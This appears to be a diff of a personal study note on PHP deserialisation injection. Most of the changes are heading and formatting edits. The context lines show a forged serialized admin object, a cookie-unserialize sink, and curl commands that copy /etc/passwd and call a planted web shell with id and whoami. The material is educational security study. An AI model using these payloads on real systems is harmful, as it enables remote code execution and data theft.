@@ -1,14 +1,14 @@
 # php-deserialisation-injection
 
 **Author:** Julien Bongars\
-**Date:** 2026-02-13 01:36:15
+**Date:** 2026-02-13 01:36:15\
 **Path:**
 
 ---
 
-`unserialize()` on attacker-controlled data runs gadget chains (magic methods → dangerous sinks). More theory than practice now — see phpggc for automated use.
+**NOTE** This is more theory than practice now. Can look at ./phpgcc docs for auto use.
 
-## PHP objects
+## PHP Objects
 
 ### Code to create object
 
@@ -37,11 +37,11 @@ $obj = unserialize($serialized);
 echo $obj->username; // "admin"
 ```
 
-### Create PHP object
+### Create PHP Object
 
 The serialized format is just a string. You don't need PHP to craft one — you can write it by hand or in any language.
 
-```txt
+```
 O:4:"User":2:{s:8:"username";s:5:"admin";s:4:"role";s:5:"admin";}
 ```
 
@@ -56,9 +56,11 @@ Breakdown:
 
 When unserialised on the server, PHP maps these values onto the existing `User` class definition. You control the **property values**, the server provides the **methods**.
 
-## Attack example
+---
 
-### Source code
+## Attack Example
+
+### Source Code
 
 ```php
 <?php
@@ -91,7 +93,7 @@ class FileBackup {
 $prefs = unserialize(base64_decode($_COOKIE['prefs']));
 ```
 
-### Build attack serialised object
+### Build Attack Serialised Object
 
 ```php
 <?php
@@ -122,7 +124,7 @@ echo "RCE payload:\n";
 echo base64_encode(serialize($rce)) . "\n";
 ```
 
-### Curl and output
+### Curl and Output
 
 ```bash
 # LFI — copy /etc/passwd to web root
@@ -143,9 +145,11 @@ curl "http://target.com/uploads/shell.php?cmd=id"
 # uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
-## Gadget chain example
+---
 
-### Straight forward chain
+## Gadget Chain Example
+
+### Straight Forward Chain
 
 A single class with a magic method that directly calls a dangerous function.
 
@@ -194,7 +198,7 @@ curl "http://target.com/shell.php?cmd=whoami"
 # Output: www-data
 ```
 
-### More sophisticated chain
+### More Sophisticated Chain
 
 Multiple classes chained together — one magic method triggers a method on a controlled property, which triggers another, until you reach a dangerous sink.
 
@@ -282,11 +286,8 @@ curl -v --cookie "token=$(python3 -c 'import urllib.parse; print(urllib.parse.qu
 # Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
-## Dangerous functions
+---
+
+## Dangerous Functions
 
 See [dangerous_functions.md](./dangerous-functions.md)
-
-## Resources
-
-- [PHP unserialize](https://www.php.net/manual/en/function.unserialize.php) — entry point and object injection
-- [PHPGGC](https://github.com/ambionics/phpggc) — generate gadget-chain payloads
